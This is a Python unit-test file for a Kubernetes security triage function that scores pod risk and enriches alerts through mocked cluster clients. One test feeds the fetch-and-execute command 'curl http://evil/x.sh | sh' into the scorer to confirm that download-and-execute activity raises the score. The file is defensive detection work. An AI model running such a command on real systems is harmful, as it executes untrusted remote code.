"""Unit tests for lambda/triage.py — all k8s and AWS calls are mocked."""
from unittest.mock import MagicMock, patch

import pytest

from triage import Action, PodContext, TriageResult, enrich, score


def _ctx(**kwargs) -> PodContext:
    defaults = dict(pod_name="test-pod", namespace="threat-demo")
    defaults.update(kwargs)
    return PodContext(**defaults)


# ---------------------------------------------------------------------------
# score() — unit tests for the scoring logic
# ---------------------------------------------------------------------------

class TestScore:
    def test_privileged_container_is_critical(self):
        result = score(_ctx(has_privileged_container=True))
        assert result.severity == "critical"
        assert result.action == Action.QUARANTINE

    def test_cluster_admin_binding_is_critical(self):
        result = score(_ctx(has_cluster_admin=True))
        assert result.severity == "critical"
        assert result.action == Action.QUARANTINE

    def test_loadbalancer_plus_root_is_high(self):
        result = score(_ctx(service_type="LoadBalancer", runs_as_root=True))
        assert result.severity in ("high", "critical")
        assert result.action == Action.QUARANTINE

    def test_host_network_is_high(self):
        result = score(_ctx(has_host_network=True))
        assert result.severity in ("high", "critical")
        assert result.action == Action.QUARANTINE

    def test_system_namespace_raises_score(self):
        base = score(_ctx())
        elevated = score(_ctx(is_system_namespace=True))
        assert elevated.score > base.score

    def test_medium_score_annotates(self):
        # root (10) + NodePort (15) = 25 → medium/annotate
        result = score(_ctx(runs_as_root=True, service_type="NodePort"))
        assert result.action == Action.ANNOTATE
        assert result.severity == "medium"

    def test_dev_namespace_lowers_score(self):
        without = score(_ctx(runs_as_root=True))
        with_dev = score(_ctx(runs_as_root=True, namespace_env="dev"))
        assert with_dev.score < without.score

    def test_no_risk_factors_is_alert_only(self):
        result = score(_ctx())
        assert result.action == Action.ALERT_ONLY
        assert result.severity == "low"

    def test_score_clamped_to_100(self):
        result = score(_ctx(
            has_privileged_container=True,
            has_cluster_admin=True,
            service_type="LoadBalancer",
            has_host_network=True,
            has_host_pid=True,
            has_dangerous_caps=True,
            runs_as_root=True,
            is_system_namespace=True,
            namespace_env="prod",
        ))
        assert result.score <= 100

    def test_reason_included_in_result(self):
        result = score(_ctx(has_privileged_container=True))
        assert "privileged" in result.reason

    def test_production_namespace_raises_score(self):
        base = score(_ctx(runs_as_root=True))
        prod = score(_ctx(runs_as_root=True, namespace_env="prod"))
        assert prod.score > base.score

    def test_staging_raises_score_more_than_dev(self):
        dev = score(_ctx(runs_as_root=True, namespace_env="dev"))
        staging = score(_ctx(runs_as_root=True, namespace_env="staging"))
        assert staging.score > dev.score

    def test_dangerous_caps_detected(self):
        result = score(_ctx(has_dangerous_caps=True))
        assert result.score >= 15

    def test_imds_rule_forces_quarantine(self):
        # Rule-name fallback (no tags) must force-quarantine IMDS access.
        result = score(_ctx(), alert_rule="imds_access_from_container")
        assert result.action == Action.QUARANTINE
        assert result.severity == "critical"

    def test_evidence_does_not_change_weighted_score(self):
        # Passing evidence must not alter scoring until the syscall-rating step.
        from triage import AlertEvidence

        ev = AlertEvidence(proc_name="sh", proc_pname="python", proc_cmdline="sh -c id")
        without = score(_ctx(runs_as_root=True, service_type="NodePort"))
        with_ev = score(_ctx(runs_as_root=True, service_type="NodePort"), evidence=ev)
        assert without.score == with_ev.score
        assert without.action == with_ev.action

    def test_app_runtime_parent_reads_as_app_rce(self):
        from triage import AlertEvidence

        ev = AlertEvidence(proc_name="sh", proc_pname="python")
        result = score(_ctx(), alert_rule="shell_in_container", evidence=ev)
        assert result.action == Action.QUARANTINE
        assert "application RCE" in result.reason

    def test_non_app_parent_reads_as_interactive_exec(self):
        from triage import AlertEvidence

        ev = AlertEvidence(proc_name="bash", proc_pname="runc:[2:INIT]")
        result = score(_ctx(), alert_rule="shell_in_container", evidence=ev)
        # Still quarantined — safety first — but flagged for review.
        assert result.action == Action.QUARANTINE
        assert "interactive exec" in result.reason

    def test_force_quarantine_without_evidence_keeps_base_reason(self):
        result = score(_ctx(), alert_rule="shell_in_container")
        assert result.action == Action.QUARANTINE
        assert "active-compromise rule" in result.reason

    def test_download_and_execute_cmdline_adds_weight(self):
        from triage import AlertEvidence

        base = score(_ctx(runs_as_root=True))
        ev = AlertEvidence(proc_cmdline="curl http://evil/x.sh | sh")
        boosted = score(_ctx(runs_as_root=True), evidence=ev)
        assert boosted.score == base.score + 20

    def test_benign_cmdline_no_weight(self):
        from triage import AlertEvidence

        base = score(_ctx(runs_as_root=True))
        ev = AlertEvidence(proc_cmdline="ls -la /tmp")
        same = score(_ctx(runs_as_root=True), evidence=ev)
        assert same.score == base.score

    def test_score_40_is_quarantine_floor(self):
        # LoadBalancer alone = 40 -> quarantine. Locks the real threshold
        # (docs historically claimed quarantine started at 70).
        result = score(_ctx(service_type="LoadBalancer"))
        assert result.score == 40
        assert result.action == Action.QUARANTINE
        assert result.severity == "high"

    def test_score_below_40_annotates(self):
        # NodePort(15) + dangerous caps(20) = 35 -> below the quarantine floor.
        result = score(_ctx(service_type="NodePort", has_dangerous_caps=True))
        assert result.score == 35
        assert result.action == Action.ANNOTATE


# ---------------------------------------------------------------------------
# enrich() — integration-style tests with mocked k8s clients
# ---------------------------------------------------------------------------

class TestEnrich:
    def _make_pod(self, **spec_kwargs):
        pod = MagicMock()
        pod.metadata.labels = {"app": "items-api"}
        pod.spec.host_network = spec_kwargs.get("host_network", False)
        pod.spec.host_pid = spec_kwargs.get("host_pid", False)
        pod.spec.security_context.run_as_user = spec_kwargs.get("run_as_user", 1000)
        pod.spec.security_context.run_as_non_root = spec_kwargs.get("run_as_non_root", True)
        pod.spec.service_account_name = spec_kwargs.get("service_account", "app-sa")
        container = MagicMock()
        container.security_context.privileged = spec_kwargs.get("privileged", False)
        container.security_context.run_as_user = spec_kwargs.get("container_run_as_user", 1000)
        container.security_context.capabilities.add = spec_kwargs.get("caps", [])
        pod.spec.containers = [container]
        pod.spec.init_containers = []  # must be explicit — unset MagicMock is truthy
        return pod

    def _make_rbac(self, crbs=None):
        rbac_v1 = MagicMock()
        rbac_v1.list_namespaced_role_binding.return_value.items = []
        rbac_v1.list_cluster_role_binding.return_value.items = crbs or []
        # _continue must be None (not an unset MagicMock) so the pagination
        # while-loop in _enrich_rbac terminates after the first page.
        rbac_v1.list_cluster_role_binding.return_value.metadata._continue = None
        return rbac_v1

    def test_privileged_container_detected(self):
        core_v1 = MagicMock()
        core_v1.read_namespaced_pod.return_value = self._make_pod(privileged=True)
        core_v1.list_namespaced_service.return_value.items = []
        core_v1.read_namespace.return_value.metadata.labels = {}

        ctx = enrich(core_v1, self._make_rbac(), "test-pod", "threat-demo")
        assert ctx.has_privileged_container is True

    def test_loadbalancer_service_detected(self):
        core_v1 = MagicMock()
        core_v1.read_namespaced_pod.return_value = self._make_pod()
        svc = MagicMock()
        svc.spec.type = "LoadBalancer"
        svc.spec.selector = {"app": "items-api"}
        core_v1.list_namespaced_service.return_value.items = [svc]
        core_v1.read_namespace.return_value.metadata.labels = {}

        ctx = enrich(core_v1, self._make_rbac(), "test-pod", "threat-demo")
        assert ctx.service_type == "LoadBalancer"

    def test_cluster_admin_binding_detected(self):
        core_v1 = MagicMock()
        core_v1.read_namespaced_pod.return_value = self._make_pod(service_account="app-sa")
        core_v1.list_namespaced_service.return_value.items = []
        core_v1.read_namespace.return_value.metadata.labels = {}

        crb = MagicMock()
        subject = MagicMock()
        subject.name = "app-sa"
        subject.kind = "ServiceAccount"
        subject.namespace = "threat-demo"
        crb.subjects = [subject]
        crb.role_ref.name = "cluster-admin"

        ctx = enrich(core_v1, self._make_rbac(crbs=[crb]), "test-pod", "threat-demo")
        assert ctx.has_cluster_admin is True

    def test_pod_not_found_returns_partial_context(self):
        from kubernetes import client as k8s_client

        core_v1 = MagicMock()
        core_v1.read_namespaced_pod.side_effect = k8s_client.ApiException(status=404)

        ctx = enrich(core_v1, self._make_rbac(), "missing-pod", "threat-demo")
        assert ctx.pod_name == "missing-pod"
        assert ctx.has_privileged_container is False

    def test_init_container_privileged_detected(self):
        core_v1 = MagicMock()
        pod = self._make_pod()
        init_container = MagicMock()
        init_container.security_context.privileged = True
        init_container.security_context.run_as_user = 1000
        init_container.security_context.capabilities.add = []
        pod.spec.init_containers = [init_container]
        core_v1.read_namespaced_pod.return_value = pod
        core_v1.list_namespaced_service.return_value.items = []
        core_v1.read_namespace.return_value.metadata.labels = {}

        ctx = enrich(core_v1, self._make_rbac(), "test-pod", "threat-demo")
        assert ctx.has_privileged_container is True

    def test_rbac_permission_denied_does_not_raise(self):
        from kubernetes import client as k8s_client

        core_v1 = MagicMock()
        rbac_v1 = MagicMock()
        core_v1.read_namespaced_pod.return_value = self._make_pod()
        core_v1.list_namespaced_service.return_value.items = []
        core_v1.read_namespace.return_value.metadata.labels = {}
        rbac_v1.list_namespaced_role_binding.side_effect = k8s_client.ApiException(status=403)
        rbac_v1.list_cluster_role_binding.side_effect = k8s_client.ApiException(status=403)

        ctx = enrich(core_v1, rbac_v1, "test-pod", "threat-demo")
        assert ctx.has_cluster_admin is False
